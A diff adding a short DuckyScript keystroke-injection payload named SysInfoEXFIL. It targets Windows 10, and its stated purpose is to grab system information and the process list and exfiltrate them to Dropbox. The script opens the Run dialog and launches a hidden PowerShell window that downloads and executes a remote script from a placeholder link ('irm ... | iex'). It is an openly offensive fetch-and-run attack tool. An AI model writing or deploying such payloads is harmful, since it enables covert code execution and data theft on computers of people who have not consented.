@@ -1,0 +1,11 @@
+REM Author:      kex 
+REM Title:       SysInfoEXFIL
+REM Target:      Windows 10 (11 untested) 
+REM Description: Grabs system info and process list and exfiltrate to dropbox
+
+DEFINE #LINK = your-direct-link
+
+GUI r
+DELAY 500
+STRING powershell.exe -WindowStyle Hidden -Command "irm '#LINK' | iex"
+ENTER
